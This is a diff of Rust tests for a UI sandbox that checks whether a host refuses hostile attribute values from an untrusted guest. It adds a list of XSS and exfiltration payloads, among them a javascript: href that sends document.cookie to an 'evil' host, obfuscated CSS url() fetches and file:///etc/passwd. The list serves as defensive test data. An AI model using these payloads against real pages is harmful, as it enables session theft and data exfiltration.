@@ -606,7 +606,13 @@ fn recycled_elements_have_distinct_host_keys_and_clearing_does_not_reset_identit
             &dispatch,
             &|_| unreachable!("test has no component slots"),
             &crate::ElementHandles::default(),
+            false,
         )
+    }
+    // The guest's first root node sits inside the host's presentation box.
+    fn guest_root_child(host_tree: &SurfaceTree) -> SurfaceNodeId {
+        let presentation_box = host_tree.node(SurfaceNodeId::ROOT).children[0];
+        host_tree.node(presentation_box).children[0]
     }
     let tree = Rc::new(std::cell::RefCell::new(SurfaceTree::new()));
     tree.borrow_mut().apply(&counter_initial_batch()).unwrap();
@@ -621,14 +627,14 @@ fn recycled_elements_have_distinct_host_keys_and_clearing_does_not_reset_identit
     );
     let mut host_tree = SurfaceTree::new();
     dom.rebuild(&mut host_tree);
-    let original_host = host_tree.node(SurfaceNodeId::ROOT).children[0];
+    let original_host = guest_root_child(&host_tree);
     let mut batch = vec![Mutation::PushId(1), Mutation::Remove];
     batch.extend(counter_initial_batch());
     tree.borrow_mut().apply(&batch).unwrap();
     let replacement = tree.borrow().lookup(ElementId::from_raw(1));
     dom.mark_dirty(dioxus_core::ScopeId::APP);
     dom.render_immediate(&mut host_tree);
-    let replacement_host = host_tree.node(SurfaceNodeId::ROOT).children[0];
+    let replacement_host = guest_root_child(&host_tree);
     assert_ne!(original_host, replacement_host);
     assert_eq!(
         &*keys.borrow(),
@@ -643,10 +649,7 @@ fn recycled_elements_have_distinct_host_keys_and_clearing_does_not_reset_identit
         .unwrap();
     dom.mark_dirty(dioxus_core::ScopeId::APP);
     dom.render_immediate(&mut host_tree);
-    assert_eq!(
-        host_tree.node(SurfaceNodeId::ROOT).children[0],
-        replacement_host
-    );
+    assert_eq!(guest_root_child(&host_tree), replacement_host);
     assert_eq!(host_tree.text_content(), "updated");
 
     tree.borrow_mut().clear();
@@ -657,10 +660,7 @@ fn recycled_elements_have_distinct_host_keys_and_clearing_does_not_reset_identit
     assert_ne!(replacement, after_clear);
     dom.mark_dirty(dioxus_core::ScopeId::APP);
     dom.render_immediate(&mut host_tree);
-    assert_ne!(
-        host_tree.node(SurfaceNodeId::ROOT).children[0],
-        replacement_host
-    );
+    assert_ne!(guest_root_child(&host_tree), replacement_host);
     assert_eq!(host_tree.text_content(), "0");
 }
 
@@ -798,6 +798,153 @@ fn valid_move_insert_replace_clone_and_id_reuse_preserve_stack_machine_semantics
     );
 }
 
+fn set_attribute_batch(
+    name: &str,
+    namespace: Option<&str>,
+    value: AttributeValue,
+) -> Vec<Mutation> {
+    vec![
+        Mutation::PushId(1),
+        Mutation::SetAttribute((name.into(), namespace.map(str::to_owned), value)),
+    ]
+}
+
+/// A hostile guest names every way the host could be made to fetch, navigate, autofill or escape
+/// its box; each batch is refused and faults the presentation like an unknown name does.
+#[test]
+fn hostile_attribute_values_and_removed_names_fault_the_presentation() {
+    let text = |value: &str| AttributeValue::Text(value.into());
+    let style = Some("style");
+    let hostile: Vec<(&str, Option<&str>, AttributeValue)> = vec![
+        // Links: only http, https and mailto, with no scheme smuggling.
+        (
+            "href",
+            None,
+            text("javascript:fetch('//evil/'+document.cookie)"),
+        ),
+        ("href", None, text("JaVaScRiPt:alert(1)")),
+        ("href", None, text(" javascript:alert(1)")),
+        ("href", None, text("java\tscript:alert(1)")),
+        ("href", None, text("https://ok.example/\nx")),
+        ("href", None, text("data:text/html,<script>1</script>")),
+        ("href", None, text("blob:https://host/uuid")),
+        ("href", None, text("file:///etc/passwd")),
+        ("href", None, text("//evil.example/x")),
+        ("href", None, text("/relative")),
+        ("href", None, text("#fragment")),
+        ("href", None, text("")),
+        ("href", None, AttributeValue::Int(1)),
+        ("href", None, AttributeValue::Boolean(true)),
+        // Names that exist only to carry a fetch, a navigation, or a form submission.
+        ("src", None, text("https://evil.example/p.png")),
+        ("srcset", None, text("https://evil.example/a 1x")),
+        ("sizes", None, text("100vw")),
+        ("poster", None, text("https://evil.example/p.png")),
+        ("action", None, text("https://evil.example/")),
+        ("formaction", None, text("https://evil.example/")),
+        ("method", None, text("post")),
+        ("form", None, text("host-form")),
+        ("target", None, text("_blank")),
+        ("download", None, text("x")),
+        ("crossorigin", None, text("anonymous")),
+        ("referrerpolicy", None, text("unsafe-url")),
+        ("ping", None, text("https://evil.example/")),
+        (
+            "href",
+            Some("http://www.w3.org/1999/xlink"),
+            text("https://evil.example/"),
+        ),
+        // Raw style bypasses every per-property check.
+        (
+            "style",
+            None,
+            text("position:fixed;inset:0;background:url(//evil/x)"),
+        ),
+        // Focus theft and password-manager autofill.
+        ("autofocus", None, AttributeValue::Boolean(true)),
+        ("accesskey", None, text("k")),
+        ("autocomplete", None, text("current-password")),
+        ("autocomplete", None, text("on")),
+        ("autocomplete", None, AttributeValue::Boolean(true)),
+        // SVG paint references.
+        ("fill", None, text("url(https://evil.example/p.svg#a)")),
+        ("stroke", None, text("URL(//evil.example/p.svg#a)")),
+        ("clip-path", None, text("url(#local)")),
+        // Style values that fetch, hide a fetch, or escape the box.
+        (
+            "background",
+            style,
+            text("url(https://evil.example/x?d=secret)"),
+        ),
+        ("background", style, text("red URL(//evil/x)")),
+        ("background", style, text("image-set('//evil/x' 1x)")),
+        (
+            "background",
+            style,
+            text("-webkit-image-set(url(//evil/x) 1x)"),
+        ),
+        ("background", style, text("image(//evil/x)")),
+        ("background", style, text("cross-fade(url(//evil/x), red)")),
+        ("background", style, text("\\75rl(//evil/x)")),
+        ("background", style, text("ur/**/l(//evil/x)")),
+        ("background", style, text("red\n")),
+        ("cursor", style, text("url(//evil/c.png), auto")),
+        ("width", style, text("attr(data-x px)")),
+        ("width", style, text("expression(alert(1))")),
+        ("color", style, text("red; @import 'x'")),
+        ("position", style, text("fixed")),
+        ("position", style, text(" FIXED ")),
+        ("position", style, text("sticky")),
+        ("position", style, text("-webkit-sticky")),
+    ];
+    for (name, namespace, value) in hostile {
+        let batch = set_attribute_batch(name, namespace, value.clone());
+        let error = assert_terminal(&batch, true);
+        assert!(
+            matches!(error, PresentationError::Unsupported(_)),
+            "{name} {namespace:?} {value:?}"
+        );
+    }
+}
+
+#[test]
+fn benign_link_and_style_values_are_admitted() {
+    let text = |value: &str| AttributeValue::Text(value.into());
+    let admitted: Vec<(&str, Option<&str>, AttributeValue)> = vec![
+        ("href", None, text("https://example.com/a?b=c#d")),
+        ("href", None, text("HTTP://example.com")),
+        (
+            "href",
+            None,
+            text("mailto:someone@example.com?subject=hi%20there"),
+        ),
+        ("href", None, AttributeValue::None),
+        ("autocomplete", None, text("off")),
+        ("autocomplete", None, AttributeValue::Boolean(false)),
+        ("fill", None, text("currentColor")),
+        ("stroke", None, text("#ff00aa")),
+        (
+            "background",
+            Some("style"),
+            text("linear-gradient(red, blue)"),
+        ),
+        ("background-color", Some("style"), text("rgb(1 2 3 / 50%)")),
+        ("position", Some("style"), text("relative")),
+        ("position", Some("style"), text("absolute")),
+        ("width", Some("style"), text("calc(100% - 4px)")),
+        ("font-family", Some("style"), text("system-ui, sans-serif")),
+        ("opacity", Some("style"), AttributeValue::Float(0.5)),
+    ];
+    for (name, namespace, value) in admitted {
+        let mut tree = SurfaceTree::new();
+        tree.apply(&counter_initial_batch()).unwrap();
+        let mut batch = set_attribute_batch(name, namespace, value.clone());
+        batch.push(Mutation::Pop);
+        tree.apply(&batch)
+            .unwrap_or_else(|error| panic!("{name} {namespace:?} {value:?}: {error}"));
+    }
+}
+
 #[test]
 fn valid_static_attributes_namespaces_and_listeners_project_into_host_vdom() {
     #[derive(Clone, PartialEq)]
@@ -810,6 +957,7 @@ fn valid_static_attributes_namespaces_and_listeners_project_into_host_vdom() {
             &dispatch,
             &|_| unreachable!("test has no component slots"),
             &crate::ElementHandles::default(),
+            false,
         )
     }
     let mut tree = SurfaceTree::new();
@@ -845,7 +993,22 @@ fn valid_static_attributes_namespaces_and_listeners_project_into_host_vdom() {
     let mut host_tree = SurfaceTree::new();
     dom.rebuild(&mut host_tree);
     assert!(host_tree.listener_id("input", "input").is_some());
-    let svg = host_tree.node(host_tree.node(SurfaceNodeId::ROOT).children[0]);
+    // Every presentation sits in a host-drawn box that contains layout and paint.
+    let boxed = host_tree.node(host_tree.node(SurfaceNodeId::ROOT).children[0]);
+    let SurfaceNodeKind::Element {
+        tag, attributes, ..
+    } = &boxed.kind
+    else {
+        panic!("the presentation box is an element");
+    };
+    assert_eq!(tag, "div");
+    let box_style = attributes
+        .get(&("style".to_owned(), None))
+        .expect("the presentation box carries its style");
+    assert!(
+        matches!(box_style, AttributeValue::Text(style) if style.contains("contain:layout paint") && style.contains("overflow:clip"))
+    );
+    let svg = host_tree.node(boxed.children[0]);
     assert!(
         matches!(&svg.kind, SurfaceNodeKind::Element { tag, namespace: Some(namespace), .. }
         if tag == "svg" && namespace == "http://www.w3.org/2000/svg")
@@ -864,6 +1027,7 @@ fn open_data_attributes_and_overflow_anchor_pass_ingress_and_render() {
             &dispatch,
             &|_| unreachable!("test has no component slots"),
             &crate::ElementHandles::default(),
+            false,
         )
     }
     let mut tree = SurfaceTree::new();
@@ -900,7 +1064,8 @@ fn open_data_attributes_and_overflow_anchor_pass_ingress_and_render() {
     let mut dom = dioxus_core::VirtualDom::new_with_props(app, Props { tree });
     let mut host_tree = SurfaceTree::new();
     dom.rebuild(&mut host_tree);
-    let div = host_tree.node(host_tree.node(SurfaceNodeId::ROOT).children[0]);
+    let presentation_box = host_tree.node(SurfaceNodeId::ROOT).children[0];
+    let div = host_tree.node(host_tree.node(presentation_box).children[0]);
     let SurfaceNodeKind::Element { attributes, .. } = &div.kind else {
         panic!("expected an element")
     };
@@ -1048,14 +1213,12 @@ fn per_node_attribute_and_listener_counts_are_bounded() {
     let names = [
         "id",
         "class",
-        "style",
         "title",
         "role",
         "tabindex",
         "hidden",
         "lang",
         "dir",
-        "accesskey",
         "contenteditable",
         "draggable",
         "spellcheck",
@@ -1070,8 +1233,6 @@ fn per_node_attribute_and_listener_counts_are_bounded() {
         "name",
         "type",
         "placeholder",
-        "autocomplete",
-        "autofocus",
         "inputmode",
         "pattern",
         "min",
@@ -1084,32 +1245,36 @@ fn per_node_attribute_and_listener_counts_are_bounded() {
         "cols",
         "wrap",
         "for",
-        "form",
-        "action",
-        "method",
-        "enctype",
         "novalidate",
         "accept",
-        "accept-charset",
-        "href",
-        "target",
         "rel",
-        "download",
-        "src",
         "alt",
         "width",
         "height",
         "loading",
-        "srcset",
-        "sizes",
-        "crossorigin",
-        "referrerpolicy",
         "open",
         "datetime",
         "start",
         "reversed",
         "colspan",
         "rowspan",
+        "data-testid",
+        "data-state",
+        "data-value",
+        "aria-label",
+        "aria-labelledby",
+        "aria-describedby",
+        "aria-hidden",
+        "aria-live",
+        "aria-atomic",
+        "aria-busy",
+        "aria-controls",
+        "aria-current",
+        "aria-disabled",
+        "aria-expanded",
+        "aria-haspopup",
+        "aria-invalid",
+        "aria-modal",
         "scope",
     ];
     assert_eq!(names.len(), SurfaceTree::MAX_ATTRIBUTES_PER_NODE + 1);
@@ -1363,6 +1528,7 @@ fn every_admitted_tag_survives_ingress_and_projects_into_the_host_vdom() {
             &dispatch,
             &|_| unreachable!("test has no component slots"),
             &crate::ElementHandles::default(),
+            false,
         )
     }
     let html = [
@@ -1393,9 +1559,14 @@ fn every_admitted_tag_survives_ingress_and_projects_into_the_host_vdom() {
     let mut dom = dioxus_core::VirtualDom::new_with_props(app, Props { tree: tree.clone() });
     let mut host_tree = SurfaceTree::new();
     dom.rebuild(&mut host_tree);
-    assert_eq!(host_tree.outline(), tree.outline());
+    // The host wraps the guest's nodes in its presentation box.
+    assert_eq!(
+        host_tree.outline(),
+        format!("(div[data-clay-presentation,style]{})", tree.outline())
+    );
+    let presentation_box = host_tree.node(SurfaceNodeId::ROOT).children[0];
     let rendered = |index: usize| match &host_tree
-        .node(host_tree.node(SurfaceNodeId::ROOT).children[index])
+        .node(host_tree.node(presentation_box).children[index])
         .kind
     {
         SurfaceNodeKind::Element { tag, namespace, .. } => (tag.clone(), namespace.clone()),
@@ -1417,6 +1588,7 @@ fn custom_elements_carry_attributes_listeners_and_children_through_the_host_vdom
             &dispatch,
             &|_| unreachable!("test has no component slots"),
             &crate::ElementHandles::default(),
+            false,
         )
     }
     let mut tree = SurfaceTree::new();
@@ -1436,7 +1608,10 @@ fn custom_elements_carry_attributes_listeners_and_children_through_the_host_vdom
     let mut dom = dioxus_core::VirtualDom::new_with_props(app, Props { tree });
     let mut host_tree = SurfaceTree::new();
     dom.rebuild(&mut host_tree);
-    assert_eq!(host_tree.outline(), "(x-card[class,data-k](span(#)))");
+    assert_eq!(
+        host_tree.outline(),
+        "(div[data-clay-presentation,style](x-card[class,data-k](span(#))))"
+    );
     assert_eq!(host_tree.text_content(), "hi");
     assert!(host_tree.listener_id("x-card", "click").is_some());
 }
@@ -1729,4 +1904,52 @@ fn svg_use_admits_only_same_document_fragments() {
             ])
             .is_ok()
     );
+}
+
+#[test]
+fn the_egress_policy_and_the_richer_vocabulary_compose_without_a_fetching_path() {
+    let apply = |tag: &str, ns: Option<&str>, name: &str, attr_ns: Option<&str>, value: &str| {
+        SurfaceTree::new().apply(&[
+            element(tag, ns),
+            text_attr(name, attr_ns, value),
+            Mutation::AppendChildren(1),
+        ])
+    };
+    // `xlink:href` is the legacy spelling of `href` and is only for SVG `<use>`, with a fragment.
+    assert!(apply("use", Some(SVG_NS), "href", Some(XLINK_NS), "#a").is_ok());
+    for (tag, ns) in [("a", None), ("path", Some(SVG_NS)), ("img", None)] {
+        assert!(
+            apply(tag, ns, "href", Some(XLINK_NS), "https://evil.example/").is_err(),
+            "{tag}"
+        );
+        assert!(
+            apply(tag, ns, "href", Some(XLINK_NS), "#a").is_err(),
+            "{tag}"
+        );
+    }
+    // `use` takes no absolute link even though `a` does; `a` takes no fragment or relative one.
+    assert!(
+        apply(
+            "use",
+            Some(SVG_NS),
+            "href",
+            None,
+            "https://evil.example/a.svg#x"
+        )
+        .is_err()
+    );
+    assert!(apply("a", None, "href", None, "https://example.com/").is_ok());
+    assert!(apply("a", None, "href", None, "#x").is_err());
+    // Neither a custom element nor a `<style>` element reopens a raw `style` attribute, a `src`,
+    // or an `action`.
+    for tag in ["x-widget", "style", "slot", "bdi"] {
+        for name in ["style", "src", "srcset", "action", "target"] {
+            assert!(
+                apply(tag, None, name, None, "https://evil.example/").is_err(),
+                "{tag} {name}"
+            );
+        }
+    }
+    // `overflow-anchor` stays an allowed style property.
+    assert!(apply("div", None, "overflow-anchor", Some("style"), "none").is_ok());
 }
